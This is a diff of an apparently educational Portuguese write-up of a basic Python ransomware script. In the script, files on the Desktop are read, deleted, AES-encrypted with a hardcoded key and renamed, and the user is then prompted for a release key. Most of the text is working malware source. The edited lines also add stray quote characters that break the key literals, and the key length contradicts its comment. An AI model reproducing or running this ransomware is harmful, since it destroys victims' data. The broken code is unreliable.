@@ -43,44 +43,43 @@ Aqui é onde a criptografia ocorre, esse é o núcleo do nosso código, primeiro
  
 def criptografando():
 
-    for files in lst_arqui:
-        for format_file in glob.glob(files):
-            print(format_file)
-            f = open(f'{desktop}\\{format_file}', 'rb')  # rb = read binary e wb = write binary
-            file_data = f.read()
-            f.close()
- 
-            os.remove(f'{desktop}\\{format_file}')
-            key = b"1cb5c7o1n3j9h7i2jj8"  # 16 byts key - chave
+    for arquivos in lst_arqui:
+        for format_arqui in glob.glob(arquivos):
+            print(format_arqui)
+            A = open(f'{desktop}\\{format_arqui}', 'rb')  # rb = read binary e wb = write binary
+            data_arqui = A.read()
+            A.close()
+            os.remove(f'{desktop}\\{format_arqui}')
+            key = b"'1cb5c7o1n3j9h7i2jj8"  # 16 byts key - chave
             aes = pyaes.AESModeOfOperationCTR(key)  # gera a criptografia
-            crypto_data = aes.encrypt(file_data)
-            new_file = format_file + ".ransomencryptador"
-            new_file = open(f'{desktop}\\{new_file}', 'wb')
-            new_file.write(crypto_data)
-            new_file.close()
+            crypto_data = aes.encrypt(data_arqui)
+            novo_arqui = format_arqui + ".ransomencrypter"
+            novo_arqui = open(f'{desktop}\\{novo_arqui}', 'wb')
+            novo_arqui.write(crypto_data)
+            novo_arqui.close()
  
 Este é o nosso descrypt ele é o responsável por fazer o processo inverso ao anterior e descriptografar o arquivo, primeiro ele checa se os arquivos são um .ransomencrypter e os le e então utilizando a chave ele descriptografa os arquivos e retorna eles para o estado anterior como se nada tivesse acontecido
  
  def descrypt(decrypt_file):
    try:
    
-       for file in glob.glob('*.ransomencryptador'):
+       for arquivo in glob.glob('*.ransomencrypter'):
             keybytes = decrypt_file.encode()
-            name_file = open(file, 'rb')
-            file_data = name_file.read()
-            dkey = keybytes
-            daes = pyaes.AESModeOfOperationCTR(dkey)  # gera a decriptografia
-            decrypt_data = daes.decrypt(file_data)
- 
-            format_file = file.split('.')
-            new_file_name = format_file[0] + '.' + format_file[1]
- 
-            dnew_file = open(f'{desktop}\\{new_file_name}', 'wb')
-            dnew_file.write(decrypt_data)
-            dnew_file.close()
+            name_arquivo = open(arquivo, 'rb')
+            data_arqui = name_arquivo.read()
+            akey = keybytes
+            aaes = pyaes.AESModeOfOperationCTR(akey)  # gera a decriptografia
+            decrypt_data = aaes.decrypt(data_arqui)
+
+            format_file = arquivo.split('.')
+            new_nome_arquivo = format_file[0] + '.' + format_file[1]
+
+            dnovo_arquivo = open(f'{desktop}\\{new_nome_arquivo}', 'wb')
+            dnovo_arquivo.write(decrypt_data)
+            dnovo_arquivo.close()
     except ValueError as err:
-        print('Chave inválida')
- 
+        print('Chave errada, que pena ;(')
+        
 Aqui é onde a mensagem de criptografia é exibida assim que os arquivos forem encriptados e pede pela chave de liberação 'Seu PC foi criptografado :p, informe a chave  para liberar os arquivos:', se a chave estiver correta ele descriptografa os arquivos e se ela não estiver correta ele exibe a mensagem 'Chave de liberação inválida.', e caso ela esteja correta o código se encerra. 
  
  
@@ -89,12 +88,10 @@ if __name__ == '__main__':
 
     criptografando()
     if criptografando:
-        key = input('Seu computador foi criptografado :p, informe a chave  para liberar os arquivos:')
-        if key == '1cb5c7o1n3j9h7i2jj8':  # confirma se a chave de descriptografia foi colocada corretamente e entãos descriptografa
+        key = input('Seu PC foi criptografado :p, informe a chave  para liberar os arquivos:')
+        if key == ''1cb5c7o1n3j9h7i2jj8':  # confirma se a chave de descriptografia foi colocada corretamente e entãos descriptografa
             descrypt(key)
-            for del_file in glob.glob('*.ransomencryptador'):
+            for del_file in glob.glob('*.ransomencrypter'):
                 os.remove(f'{desktop}\\{del_file}')
         else:
-            print('Chave de liberação inválida.')
-
-
+            print('Chave de liberação inválida, que pena ;(')
